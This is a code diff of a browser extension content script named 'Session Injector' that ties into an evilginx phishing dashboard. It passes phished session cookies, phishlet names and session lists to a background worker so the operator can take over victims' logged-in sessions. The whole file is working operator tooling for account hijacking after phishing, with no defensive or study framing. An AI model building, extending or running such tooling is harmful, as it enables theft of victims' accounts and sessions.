@@ -1,54 +1,52 @@
-// Session Injector — content script
-// Activates only on pages that identify as the evilginx dashboard,
-// bridges inject requests to the background worker, and tracks session
-// selection state for the extension popup.
+// Session Injector - content script.
+// Runs on pages that identify as an evilginx dashboard (both the operator
+// control panel and the per-server dashboard use data-app="ctrl-panel"), and
+// bridges dashboard events to the background worker.
 
 (function () {
   if (!document.body || document.body.dataset.app !== 'ctrl-panel') return;
 
-  // Signal presence to the dashboard JS.
   window.__ctrlExtension = true;
   document.dispatchEvent(new CustomEvent('ext-ready'));
+  chrome.storage.local.set({ dashboardConnected: true, dashboardUrl: window.location.origin });
+  chrome.runtime.sendMessage({ action: 'dashboard', url: window.location.origin });
 
-  // Mark dashboard as reachable for the popup.
-  chrome.storage.local.set({
-    dashboardConnected: true,
-    dashboardUrl: window.location.origin
-  });
-
-  // Clean up when the tab is unloaded.
   window.addEventListener('unload', function () {
     chrome.storage.local.set({ dashboardConnected: false });
   });
 
   window.addEventListener('message', function (event) {
     if (event.source !== window || !event.data) return;
+    var m = event.data;
 
-    // Inject request from dashboard.
-    if (event.data.type === 'DO_INJECT') {
-      var payload = event.data.payload;
-      chrome.runtime.sendMessage(
-        { action: 'inject', cookies: payload.cookies, targetUrl: payload.target_url },
-        function (result) {
-          var r = result || {};
-          // Store result for popup display.
-          chrome.storage.local.set({ lastInject: {
-            sessionId: payload.session_id,
-            phishlet:  payload.phishlet,
-            count:     r.success || 0,
-            failed:    r.failed  || 0,
-            targetUrl: payload.target_url,
-            time:      Date.now()
-          }});
-          // Forward result back to dashboard page.
-          window.dispatchEvent(new CustomEvent('inject-result', { detail: r }));
-        }
-      );
+    // Take over a session (payload already carries the cookies).
+    if (m.type === 'DO_INJECT') {
+      chrome.runtime.sendMessage({ action: 'inject', payload: m.payload, mode: m.mode }, function (r) {
+        var res = r || {};
+        chrome.storage.local.set({
+          lastInject: {
+            sessionId: m.payload && m.payload.session_id,
+            phishlet: m.payload && m.payload.phishlet,
+            count: res.success || 0,
+            failed: res.failed || 0,
+            where: res.where || '',
+            error: res.error || '',
+            targetUrl: m.payload && m.payload.target_url,
+            time: Date.now(),
+          },
+        });
+        window.dispatchEvent(new CustomEvent('inject-result', { detail: res }));
+      });
     }
 
-    // Session selected in dashboard — store for popup.
-    if (event.data.type === 'SESSION_SELECT') {
-      chrome.storage.local.set({ currentSession: event.data.payload });
+    // Dashboard tells us which row is selected.
+    if (m.type === 'SESSION_SELECT') {
+      chrome.storage.local.set({ currentSession: m.payload });
+    }
+
+    // Dashboard pushed its session list: feeds the badge and auto-open.
+    if (m.type === 'SESSIONS') {
+      chrome.runtime.sendMessage({ action: 'sessions', list: m.payload || [] });
     }
   });
 })();
